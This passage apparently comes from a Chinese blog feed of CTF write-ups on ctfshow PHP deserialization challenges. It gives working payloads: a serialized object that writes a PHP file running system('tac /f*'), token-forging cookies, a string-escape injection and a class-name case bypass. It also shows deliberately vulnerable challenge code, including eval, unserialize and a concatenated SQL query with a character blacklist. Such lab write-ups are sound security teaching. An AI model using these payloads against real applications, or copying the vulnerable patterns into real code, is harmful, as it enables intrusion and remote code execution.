class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;:8&#x27;</span>,<span class="string">&#x27;:+8&#x27;</span>,<span class="variable">$b</span>);</span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">urlencode</span>(<span class="variable">$b</span>));</span><br></pre></td></tr></table></figure>
<p>?username=xxxxxx&amp;password=xxxxxx</p>
<p>ctfshow{bcf9331c-656d-4fba-81d7-f0127fd2ad28}</p>
<h1>web259</h1>
<p>等待c</p>
<h1>web260</h1>
<p>?ctfshow=ctfshow_i_love_36D</p>
<p>ctfshow{b6341f38-95c0-4dfe-ac89-398b2cea861b}</p>
<h1>web261</h1>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshowvip</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username=<span class="variable">$u</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password=<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;username!=<span class="string">&#x27;&#x27;</span> || <span class="variable language_">$this</span>-&gt;password!=<span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unserialize</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username=<span class="variable">$data</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password=<span class="variable">$data</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;code = <span class="variable language_">$this</span>-&gt;username.<span class="variable language_">$this</span>-&gt;password;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;code==<span class="number">0x36d</span>)&#123;</span><br><span class="line">            <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;username, <span class="variable">$this</span>-&gt;password);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;vip&#x27;</span>]);</span><br></pre></td></tr></table></figure>
<p>我们看代码的时候看到invoke 下面有一个eval函数，但这里没有办法使用eval函数</p>
<p>如果类中同时定义了 unserialize() 和 wakeup() 两个魔术方法， 则只有 unserialize() 方法会生效，wakeup() 方法会被忽略。</p>
<p>那么我们就只可以用下面的file_put_contents函数</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshowvip</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$u</span>, <span class="variable">$p</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$u</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ctfshowvip</span>(<span class="string">&#x27;877.php&#x27;</span>,<span class="string">&quot;&lt;?php system(&#x27;tac /f*&#x27;);?&gt;&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$c</span>);</span><br></pre></td></tr></table></figure>
<p>O:10:“ctfshowvip”:3:{s:8:“username”;s:7:“877.php”;s:8:“password”;s:26:“<?php system('tac /f*');?>”;s:4:“code”;N;}</p>
<p>访问877.php</p>
<p>ctfshow{ec5d5638-17ac-451e-9028-906e0746cc51}</p>
<h1>web262</h1>
<p>仔细看的话会发现一个message.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-12-03 15:13:03</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-12-03 15:17:17</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">message</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$from</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$msg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$to</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="keyword">from</span> = <span class="variable">$f</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;msg = <span class="variable">$m</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;to = <span class="variable">$t</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;msg&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;msg&#x27;</span>]));</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$msg</span>-&gt;token==<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">message</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title function_ invoke__">message</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$c</span>));</span><br></pre></td></tr></table></figure>
<p>Tzo3OiJtZXNzYWdlIjoxOntzOjU6InRva2VuIjtzOjU6ImFkbWluIjt9</p>
<p>然后cookie=msg=Tzo3OiJtZXNzYWdlIjoxOntzOjU6InRva2VuIjtzOjU6ImFkbWluIjt9</p>
<p>ctfshow{e1c8fc63-d209-4292-b449-682db6d888bb}</p>
<p>这还有一个字符串逃逸的知识点</p>
<p>我们填进去一个fuck就会被替换成loveU，字符多了1。但是我们序列化的东西还是识别四个字符…</p>
<p>O:7:“message”:4:{s:4:“from”;s:1:“1”;s:3:“msg”;s:1:“1”;s:2:“to”;s:1:“1”;s:5:“token”;s:5:“admin”;}</p>
<p>&quot;;s:5:“token”;s:5:“admin”;}		共27个字符</p>
<p>fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck</p>
<p>?f=1&amp;m=1&amp;t=fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;;s:5:“token”;s:5:“admin”;}</p>
<h1>web263</h1>
<p>待c</p>
<h1>web264</h1>
<p>O:7:“message”:4:{s:4:“from”;s:1:“1”;s:3:“msg”;s:1:“2”;s:2:“to”;s:1:“3”;s:5:“token”;s:5:“admin”;}</p>
<p>&quot;;s:5:“token”;s:5:“admin”;}27</p>
<p>fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck</p>
<p>?f=1&amp;m=1&amp;t=fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;;s:5:“token”;s:5:“admin”;}</p>
<p>?f=1&amp;m=1&amp;t=fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;;s:5:“token”;s:5:“admin”;}</p>
<p>在cookie里面添加一个msg，值随意</p>
<p><img src="/2025/02/05/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250205161026194.png" alt="image-20250205161026194"></p>
<p>ctfshow{21867c6d-45e3-4005-9f1b-a4be7fdb6683}</p>
<h1>web265</h1>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-12-04 23:52:24</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-12-05 00:17:08</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshowAdmin</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$t</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;token=<span class="variable">$t</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;token===<span class="variable language_">$this</span>-&gt;password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$ctfshow</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ctfshow&#x27;</span>]);</span><br><span class="line"><span class="variable">$ctfshow</span>-&gt;token=<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">mt_rand</span>());</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ctfshow</span>-&gt;<span class="title function_ invoke__">login</span>())&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>php当中的引用</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="number">10</span>;</span><br><span class="line"><span class="variable">$b</span> = &amp;<span class="variable">$a</span>; <span class="comment">// $b 是 $a 的引用</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>; <span class="comment">// 输出 10</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>; <span class="comment">// 输出 10</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="number">20</span>; <span class="comment">// 修改 $a 的值</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>; <span class="comment">// 输出 20，因为 $b 是 $a 的引用</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshowAdmin</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ctfshowAdmin</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;token=&amp;<span class="variable">$a</span>-&gt;password;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:12:&quot;ctfshowAdmin&quot;:2:&#123;s:5:&quot;token&quot;;N;s:8:&quot;password&quot;;R:2;&#125;</span><br></pre></td></tr></table></figure>
<p>ctfshow{1204ba0a-88e9-4675-92b9-9f153f3f0b52}</p>
<h1>web266</h1>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-12-04 23:52:24</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-12-05 00:17:08</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="variable">$cs</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshow</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username=<span class="variable">$u</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password=<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username===<span class="variable language_">$this</span>-&gt;password;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ctfshowo</span>=@<span class="title function_ invoke__">unserialize</span>(<span class="variable">$cs</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ctfshow/&#x27;</span>, <span class="variable">$cs</span>))&#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;Error <span class="subst">$ctfshowo</span>&quot;</span>,<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这一题要我们执行销毁函数，但是后面会有一个ctfshow字符串的过滤</p>
<p>过滤了<code>ctfshow</code>但是我这里用的是<code>cTFSHOW</code>，在PHP中，类不区分大小写；所以绕过了过滤。</p>
<p>O:7:“ctfsHow”:2:{s:8:“username”;s:6:“xxxxxx”;s:8:“password”;s:6:&quot;xxxxxx</p>
<p>$cs = file_get_contents(‘php://input’);好像是因为这个东西就不能用hackbar，只能用bp抓包</p>
<p><img src="/2025/02/05/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250205220706308.png" alt="image-20250205220706308"></p>
<p>ctfshow{c6ecc3df-b248-496b-a2be-6fa9cd83b68c}</p>
<h1>web267</h1>
<p>待c</p>
]]></content>
      <tags>
        <tag>反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>刷刷,🐂木的,瓶颈到了</title>
    <url>/2025/05/02/%E5%88%B7%E5%88%B7-%F0%9F%90%82%E6%9C%A8%E7%9A%84-%E7%93%B6%E9%A2%88%E5%88%B0%E4%BA%86/</url>
    <content><![CDATA[<h1>warmup</h1>
<p>题目给了三个源码</p>
<p><strong>源码conn.php</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">SQL</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$table</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$conn</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">connect</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;conn = <span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>(<span class="string">&quot;localhost&quot;</span>, <span class="string">&quot;xxxxx&quot;</span>, <span class="string">&quot;xxxx&quot;</span>, <span class="string">&quot;xxxx&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">check_login</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$result</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">query</span>();</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$result</span> === <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;database error, please check your input&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$row</span> = <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetch_assoc</span>();</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$row</span> === <span class="literal">NULL</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;username or password incorrect!&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>] === <span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">            <span class="variable">$flag</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;welcome, admin! this is your flag -&gt; &quot;</span>.<span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;welcome! but you are not admin&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">free</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">query</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">waf</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;conn-&gt;<span class="title function_ invoke__">query</span> (<span class="string">&quot;select username,password from &quot;</span>.<span class="variable">$this</span>-&gt;table.<span class="string">&quot; where username=&#x27;&quot;</span>.<span class="variable">$this</span>-&gt;username.<span class="string">&quot;&#x27; and password=&#x27;&quot;</span>.<span class="variable">$this</span>-&gt;password.<span class="string">&quot;&#x27;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    	<span class="variable">$blacklist</span> = [<span class="string">&quot;union&quot;</span>, <span class="string">&quot;join&quot;</span>, <span class="string">&quot;!&quot;</span>, <span class="string">&quot;\&quot;&quot;</span>, <span class="string">&quot;#&quot;</span>, <span class="string">&quot;$&quot;</span>, <span class="string">&quot;%&quot;</span>, <span class="string">&quot;&amp;&quot;</span>, <span class="string">&quot;.&quot;</span>, <span class="string">&quot;/&quot;</span>, <span class="string">&quot;:&quot;</span>, <span class="string">&quot;;&quot;</span>, <span class="string">&quot;^&quot;</span>, <span class="string">&quot;_&quot;</span>, <span class="string">&quot;`&quot;</span>, <span class="string">&quot;&#123;&quot;</span>, <span class="string">&quot;|&quot;</span>, <span class="string">&quot;&#125;&quot;</span>, <span class="string">&quot;&lt;&quot;</span>, <span class="string">&quot;&gt;&quot;</span>, <span class="string">&quot;?&quot;</span>, <span class="string">&quot;@&quot;</span>, <span class="string">&quot;[&quot;</span>, <span class="string">&quot;\\&quot;</span>, <span class="string">&quot;]&quot;</span> , <span class="string">&quot;*&quot;</span>, <span class="string">&quot;+&quot;</span>, <span class="string">&quot;-&quot;</span>];</span><br><span class="line">    	<span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$value</span>) &#123;</span><br><span class="line">    		<span class="keyword">if</span>(<span class="title function_ invoke__">strripos</span>(<span class="variable">$this</span>-&gt;table, <span class="variable">$value</span>))&#123;</span><br><span class="line">    			<span class="keyword">die</span>(<span class="string">&#x27;bad hacker,go out!&#x27;</span>);</span><br><span class="line">    		&#125;</span><br><span class="line">    	&#125;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$value</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">strripos</span>(<span class="variable">$this</span>-&gt;username, <span class="variable">$value</span>))&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;bad hacker,go out!&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$value</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">strripos</span>(<span class="variable">$this</span>-&gt;password, <span class="variable">$value</span>))&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;bad hacker,go out!&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">isset</span> (<span class="variable language_">$this</span>-&gt;conn)) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">connect</span> ();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;table)&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">waf</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">check_login</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;conn-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>源码index.php</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;!doctype html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;平平无奇的登陆界面&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;style type=<span class="string">&quot;text/css&quot;</span>&gt;</span><br><span class="line">    body &#123;</span><br><span class="line">        margin: <span class="number">0</span>;</span><br><span class="line">        padding: <span class="number">0</span>;</span><br><span class="line">        font-family: sans-serif;</span><br><span class="line">        background: <span class="title function_ invoke__">url</span>(<span class="string">&quot;static/background.jpg&quot;</span>);</span><br><span class="line">        <span class="comment">/*背景图片自定义*/</span></span><br><span class="line">        background-size: cover;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    .box 